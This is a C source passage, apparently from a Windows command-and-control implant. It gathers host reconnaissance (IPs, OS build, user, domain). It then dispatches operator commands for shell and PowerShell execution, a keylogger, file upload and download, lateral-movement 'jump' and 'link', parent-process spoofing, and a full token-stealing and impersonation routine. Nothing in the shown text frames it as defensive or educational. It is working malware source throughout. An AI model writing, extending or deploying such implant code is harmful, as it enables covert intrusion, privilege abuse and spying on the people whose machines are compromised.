            typedef int (WINAPI *pWSAStartup)(WORD, void *);
            typedef int (WINAPI *pGetAddrInfoA)(const char *, const char *, const void *, void **);
            typedef void (WINAPI *pFreeAddrInfoA)(void *);
            typedef int (WINAPI *pWSACleanup)(void);

            HMODULE hWs2 = LoadLibraryA("ws2_32.dll");
            if (hWs2) {
                pWSAStartup  fnStart   = (pWSAStartup)GetProcAddress(hWs2, "WSAStartup");
                pGetAddrInfoA fnGetAI  = (pGetAddrInfoA)GetProcAddress(hWs2, "getaddrinfo");
                pFreeAddrInfoA fnFreeAI = (pFreeAddrInfoA)GetProcAddress(hWs2, "freeaddrinfo");
                pWSACleanup  fnCleanup = (pWSACleanup)GetProcAddress(hWs2, "WSACleanup");

                if (fnStart && fnGetAI && fnFreeAI && fnCleanup) {
                    unsigned char wsaData[512];
                    fnStart(0x0202 /*MAKEWORD(2,2)*/, wsaData);

                    /* Resolve own hostname → all IPs */
                    typedef struct _HI {
                        int ai_flags;
                        int ai_family;
                        int ai_socktype;
                        int ai_protocol;
                        size_t ai_addrlen;
                        char *ai_canonname;
                        void *ai_addr;   /* struct sockaddr* */
                        struct _HI *ai_next;
                    } HI;

                    HI hints;
                    memset(&hints, 0, sizeof(hints));
                    hints.ai_family = 0; /* AF_UNSPEC */
                    hints.ai_socktype = 1; /* SOCK_STREAM */

                    HI *result = NULL;
                    if (fnGetAI(hostname, NULL, (const void *)&hints, (void **)&result) == 0 && result) {
                        HI *cur = result;
                        while (cur) {
                            if (cur->ai_family == 2 /* AF_INET */ && cur->ai_addr) {
                                /* sockaddr_in: family(2) + port(2) + addr(4) */
                                unsigned char *sa = (unsigned char *)cur->ai_addr;
                                unsigned char *ip = sa + 4;
                                /* Skip loopback 127.x.x.x */
                                if (ip[0] != 127) {
                                    snprintf(line, sizeof(line), "IP: %u.%u.%u.%u\n",
                                             ip[0], ip[1], ip[2], ip[3]);
                                    buf_append(out, line, (DWORD)strlen(line));
                                }
                            }
                            /* IPv6 skipped — only report IPv4 */
                            cur = cur->ai_next;
                        }
                        fnFreeAI(result);
                    }
                    fnCleanup();
                }
                FreeLibrary(hWs2);
            }
        }
    }

    /* ── OS ── */
    {
        HKEY hKey;
        char product[256] = {0};
        char buildstr[64] = {0};
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD psize = sizeof(product);
            DWORD bsize = sizeof(buildstr);
            RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)product, &psize);
            RegQueryValueExA(hKey, "CurrentBuildNumber", NULL, NULL, (LPBYTE)buildstr, &bsize);
            RegCloseKey(hKey);
        }
        /* Win11 registry still says "Windows 10" — fix via build >= 22000 */
        if (product[0]) {
            int bnum = atoi(buildstr);
            if (bnum >= 22000) {
                char *p10 = strstr(product, "Windows 10");
                if (p10) p10[9] = '1';  /* "Windows 10" → "Windows 11" */
            }
            snprintf(line, sizeof(line), "OS: %s\n", product);
        } else {
            snprintf(line, sizeof(line), "OS: Windows (unknown edition)\n");
        }
        buf_append(out, line, (DWORD)strlen(line));
    }

    /* ── User ── */
    {
        HANDLE hToken;
        BOOL gotToken = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken);
        if (!gotToken)
            gotToken = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
        if (gotToken) {
            DWORD tlen = 0;
            GetTokenInformation(hToken, TokenUser, NULL, 0, &tlen);
            if (tlen > 0) {
                unsigned char *tbuf = (unsigned char *)malloc(tlen);
                if (tbuf && GetTokenInformation(hToken, TokenUser, tbuf, tlen, &tlen)) {
                    TOKEN_USER *tu = (TOKEN_USER *)tbuf;
                    char uname[128] = {0}, domain[128] = {0};
                    DWORD uname_len = sizeof(uname), domain_len = sizeof(domain);
                    SID_NAME_USE snu;
                    if (LookupAccountSidA(NULL, tu->User.Sid, uname, &uname_len,
                                          domain, &domain_len, &snu)) {
                        snprintf(line, sizeof(line), "User: %s\\%s\n", domain, uname);
                        buf_append(out, line, (DWORD)strlen(line));
                    }
                }
                free(tbuf);
            }
            CloseHandle(hToken);
        }
    }

    /* ── Domain ── */
    {
        typedef DWORD (WINAPI *pDsRoleGetPrimaryDomainInformation)(
            const wchar_t *, DWORD, void **);
        typedef void (WINAPI *pDsRoleFreeMemory)(void *);

        HMODULE hDs = LoadLibraryA("dsrole.dll");
        BOOL domain_printed = FALSE;
        if (hDs) {
            pDsRoleGetPrimaryDomainInformation fnGet =
                (pDsRoleGetPrimaryDomainInformation)GetProcAddress(hDs, "DsRoleGetPrimaryDomainInformation");
            pDsRoleFreeMemory fnFree =
                (pDsRoleFreeMemory)GetProcAddress(hDs, "DsRoleFreeMemory");

            if (fnGet && fnFree) {
                /* DSROLE_PRIMARY_DOMAIN_INFO_BASIC = 1 */
                typedef struct {
                    DWORD MachineRole;
                    DWORD Flags;
                    wchar_t *DomainNameFlat;
                    wchar_t *DomainNameDns;
                    wchar_t *DomainForestName;
                    GUID    DomainGuid;
                } DSROLE_INFO;

                DSROLE_INFO *info = NULL;
                if (fnGet(NULL, 1, (void **)&info) == 0 && info) {
                    /*
                     * MachineRole:
                     *   0 = DsRole_RoleStandaloneWorkstation
                     *   1 = DsRole_RoleMemberWorkstation
                     *   2 = DsRole_RoleStandaloneServer
                     *   3 = DsRole_RoleMemberServer
                     *   4 = DsRole_RoleBackupDomainController
                     *   5 = DsRole_RolePrimaryDomainController
                     */
                    if (info->MachineRole >= 1 && info->MachineRole != 2 &&
                        info->DomainNameDns) {
                        char dns_domain[256] = {0};
                        WideCharToMultiByte(CP_UTF8, 0, info->DomainNameDns, -1,
                                            dns_domain, sizeof(dns_domain), NULL, NULL);
                        if (dns_domain[0]) {
                            snprintf(line, sizeof(line), "Domain: %s\n", dns_domain);
                            buf_append(out, line, (DWORD)strlen(line));
                            domain_printed = TRUE;
                        }
                    }
                    fnFree(info);
                }
            }
            FreeLibrary(hDs);
        }
        if (!domain_printed) {
            /* Fallback: USERDOMAIN env or USERDNSDOMAIN */
            char env_dom[256] = {0};
            if (GetEnvironmentVariableA("USERDNSDOMAIN", env_dom, sizeof(env_dom)) > 0) {
                snprintf(line, sizeof(line), "Domain: %s\n", env_dom);
                buf_append(out, line, (DWORD)strlen(line));
            } else if (GetEnvironmentVariableA("USERDOMAIN", env_dom, sizeof(env_dom)) > 0) {
                /* Only print if it differs from hostname (workgroup = hostname) */
                if (_stricmp(env_dom, hostname) != 0) {
                    snprintf(line, sizeof(line), "Domain: %s\n", env_dom);
                    buf_append(out, line, (DWORD)strlen(line));
                }
            }
            /* If none of the above matched, machine is not domain-joined — omit line */
        }
    }

    /* ── Path (system directory) ── */
    {
        char sysdir[MAX_PATH] = {0};
        GetSystemDirectoryA(sysdir, MAX_PATH);
        snprintf(line, sizeof(line), "Path: %s\n", sysdir);
        buf_append(out, line, (DWORD)strlen(line));
    }

    /* ── Version (OS build) ── */
    {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char build[64] = {0};
            DWORD bsize = sizeof(build);
            RegQueryValueExA(hKey, "CurrentBuildNumber", NULL, NULL, (LPBYTE)build, &bsize);

            /* UBR (Update Build Revision) gives the full 10.0.XXXXX.YYYY version */
            DWORD ubr = 0, ubr_size = sizeof(ubr), ubr_type = 0;
            if (RegQueryValueExA(hKey, "UBR", NULL, &ubr_type, (LPBYTE)&ubr, &ubr_size) == ERROR_SUCCESS
                && ubr_type == REG_DWORD && ubr > 0) {
                snprintf(line, sizeof(line), "Version: 10.0.%s.%u\n", build, (unsigned)ubr);
            } else {
                snprintf(line, sizeof(line), "Version: 10.0.%s\n", build);
            }
            buf_append(out, line, (DWORD)strlen(line));
            RegCloseKey(hKey);
        }
    }
}

/* ─── Module dispatch ─── */

BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
                    unsigned char **result, DWORD *result_len) {
    Buffer out;
    buf_init(&out, 4096);

    DBG("[module] executing module '%s' (args_len=%u)", name, args_len);

    ArgParser ap;
    arg_parse_init(&ap, args, args_len);

    if (_mod_eq(name, _mn_systeminfo, sizeof(_mn_systeminfo))) {
        mod_systeminfo(&out);
    }
    else if (_mod_eq(name, _mn_whoami, sizeof(_mn_whoami))) {
        mod_whoami(&out);
    }
    else if (_mod_eq(name, _mn_ps, sizeof(_mn_ps))) {
        mod_ps(&out);
    }
    else if (_mod_eq(name, _mn_ls, sizeof(_mn_ls))) {
        /* Args come as raw string from operator, not BeaconDataParse format */
        char *path_str = NULL;
        if (args && args_len > 0) {
            path_str = (char *)malloc(args_len + 1);
            memcpy(path_str, args, args_len);
            path_str[args_len] = '\0';
        }
        mod_ls(&out, path_str);
        if (path_str) free(path_str);
    }
    else if (_mod_eq(name, _mn_cd, sizeof(_mn_cd))) {
        char *path_str = NULL;
        if (args && args_len > 0) {
            path_str = (char *)malloc(args_len + 1);
            memcpy(path_str, args, args_len);
            path_str[args_len] = '\0';
        }
        mod_cd(&out, path_str);
        if (path_str) free(path_str);
    }
    else if (_mod_eq(name, _mn_cat, sizeof(_mn_cat))) {
        char *path_str = NULL;
        if (args && args_len > 0) {
            path_str = (char *)malloc(args_len + 1);
            memcpy(path_str, args, args_len);
            path_str[args_len] = '\0';
        }
        mod_cat(&out, path_str);
        if (path_str) free(path_str);
    }
    else if (_mod_eq(name, _mn_keylogger, sizeof(_mn_keylogger))) {
        char *sub = NULL;
        if (args && args_len > 0) {
            sub = (char *)malloc(args_len + 1);
            memcpy(sub, args, args_len);
            sub[args_len] = '\0';
        }
        mod_keylogger(&out, sub);
        if (sub) free(sub);
    }
    else if (_mod_eq(name, _mn_jump, sizeof(_mn_jump))) {
        mod_jump(&out, args, args_len);
    }
    else if (_mod_eq(name, _mn_link, sizeof(_mn_link))) {
        mod_link(&out, args, args_len);
    }
    else if (_mod_eq(name, _mn_unlink, sizeof(_mn_unlink))) {
        char *tgt = NULL;
        if (args && args_len > 0) {
            tgt = (char *)malloc(args_len + 1);
            memcpy(tgt, args, args_len);
            tgt[args_len] = '\0';
        }
        mod_unlink(&out, (const unsigned char *)tgt, tgt ? (DWORD)strlen(tgt) : 0);
        if (tgt) free(tgt);
    }
    else if (_mod_eq(name, _mn_spawnto, sizeof(_mn_spawnto))) {
        char *sub = NULL;
        if (args && args_len > 0) {
            sub = (char *)malloc(args_len + 1);
            memcpy(sub, args, args_len);
            sub[args_len] = '\0';
        }
        mod_spawnto(&out, sub);
        if (sub) free(sub);
    }
    else if (_mod_eq(name, _mn_ppid, sizeof(_mn_ppid))) {
        char *sub = NULL;
        if (args && args_len > 0) {
            sub = (char *)malloc(args_len + 1);
            memcpy(sub, args, args_len);
            sub[args_len] = '\0';
        }
        mod_ppid(&out, sub);
        if (sub) free(sub);
    }
    else if (_mod_eq(name, _mn_spawn, sizeof(_mn_spawn))) {
        mod_spawn(&out, args, args_len);
    }
    else if (_mod_eq(name, _mn_upload, sizeof(_mn_upload))) {
        const char *path = arg_extract_str(&ap);
        DWORD data_len;
        const unsigned char *data = arg_extract_bin(&ap, &data_len);
        mod_upload(&out, path, data, data_len);
    }
    else if (_mod_eq(name, _mn_download, sizeof(_mn_download))) {
        char *path_str = NULL;
        if (args && args_len > 0) {
            path_str = (char *)malloc(args_len + 1);
            memcpy(path_str, args, args_len);
            path_str[args_len] = '\0';
        }
        mod_download(&out, path_str ? path_str : "");
        if (path_str) free(path_str);
    }
    else if (_mod_eq(name, _mn_shell, sizeof(_mn_shell)) || _mod_eq(name, _mn_powershell, sizeof(_mn_powershell))) {
        /*
         * shell/powershell: arguments come as raw UTF-8 bytes (NOT BeaconDataParse format).
         * The operator CLI sends the command string directly.
         */
        BOOL use_ps = _mod_eq(name, _mn_powershell, sizeof(_mn_powershell));
        if (args && args_len > 0) {
            /* Null-terminate the command string */
            char *cmd_str = (char *)malloc(args_len + 1);
            memcpy(cmd_str, args, args_len);
            cmd_str[args_len] = '\0';
            mod_shell_exec(&out, cmd_str, use_ps);
            free(cmd_str);
        } else {
            buf_append(&out, "No command specified\n", 20);
        }
    }
    else if (_mod_eq(name, _mn_steal_token, sizeof(_mn_steal_token))) {
        /* steal_token <PID>
         * Opens target process, duplicates its token, impersonates it.
         * Args come as raw string: the PID number. */
        DWORD target_pid = 0;
        if (args && args_len > 0) {
            char pid_str[32] = {0};
            DWORD copy_len = args_len < 31 ? args_len : 31;
            memcpy(pid_str, args, copy_len);
            target_pid = (DWORD)atoi(pid_str);
        }
        if (target_pid == 0) {
            buf_append(&out, "[!] Usage: steal_token <PID>\n", 28);
        } else {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
            if (!hProc)
                hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, target_pid);
            if (!hProc) {
                char err[128];
                snprintf(err, sizeof(err), "[!] Cannot open PID %u (err=%u)\n",
                         (unsigned)target_pid, (unsigned)GetLastError());
                buf_append(&out, err, (DWORD)strlen(err));
            } else {
                HANDLE hToken = NULL;
                if (!OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken)) {
                    char err[128];
                    snprintf(err, sizeof(err), "[!] Cannot query token for PID %u (err=%u)\n",
                             (unsigned)target_pid, (unsigned)GetLastError());
                    buf_append(&out, err, (DWORD)strlen(err));
                    CloseHandle(hProc);
                } else {
                    HANDLE hDup = NULL;
                    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                                          SecurityImpersonation, TokenImpersonation, &hDup)) {
                        char err[128];
                        snprintf(err, sizeof(err), "[!] Token duplication failed: %u\n",
                                 (unsigned)GetLastError());
                        buf_append(&out, err, (DWORD)strlen(err));
                    } else {
                        if (!ImpersonateLoggedOnUser(hDup)) {
                            char err[128];
                            snprintf(err, sizeof(err), "[!] Impersonation failed: %u\n",
                                     (unsigned)GetLastError());
                            buf_append(&out, err, (DWORD)strlen(err));
                            CloseHandle(hDup);
                        } else {
                            /* Success — resolve the stolen identity */
                            DWORD tlen = 0;
                            GetTokenInformation(hDup, TokenUser, NULL, 0, &tlen);
                            char user_str[256] = "???";
                            if (tlen > 0) {
                                unsigned char *tbuf = (unsigned char *)malloc(tlen);
                                if (tbuf && GetTokenInformation(hDup, TokenUser, tbuf, tlen, &tlen)) {
                                    TOKEN_USER *tu = (TOKEN_USER *)tbuf;
                                    char uname[128] = {0}, domain[128] = {0};
                                    DWORD uname_len = sizeof(uname), domain_len = sizeof(domain);
                                    SID_NAME_USE snu;
                                    if (LookupAccountSidA(NULL, tu->User.Sid, uname, &uname_len,
                                                          domain, &domain_len, &snu)) {
                                        snprintf(user_str, sizeof(user_str), "%s\\%s", domain, uname);
                                    }
                                }
                                free(tbuf);
                            }
                            char msg[512];
                            snprintf(msg, sizeof(msg),
                                "[+] Successfully stole token from PID %u\n"
                                "[+] Impersonating: %s\n",
                                (unsigned)target_pid, user_str);
                            buf_append(&out, msg, (DWORD)strlen(msg));
                            /* Don't close hDup — impersonation holds the reference */
                        }
                    }
                    CloseHandle(hToken);
                    CloseHandle(hProc);
                }
            }
        }
    }
    else if (_mod_eq(name, _mn_rev2self, sizeof(_mn_rev2self))) {
        if (RevertToSelf()) {
            buf_append(&out, "[+] Reverted to process token\n", 30);
        } else {
            char err[128];
            snprintf(err, sizeof(err), "[-] Token revert failed (err=%u)\n", (unsigned)GetLastError());
            buf_append(&out, err, (DWORD)strlen(err));
        }
    }
    else {
        char err[256];
        snprintf(err, sizeof(err), "Unknown module: %s\n", name);
        buf_append(&out, err, (DWORD)strlen(err));
        *result = out.data;
        *result_len = out.len;
        return FALSE;
    }

    *result = out.data;
    *result_len = out.len;
    return TRUE;
}
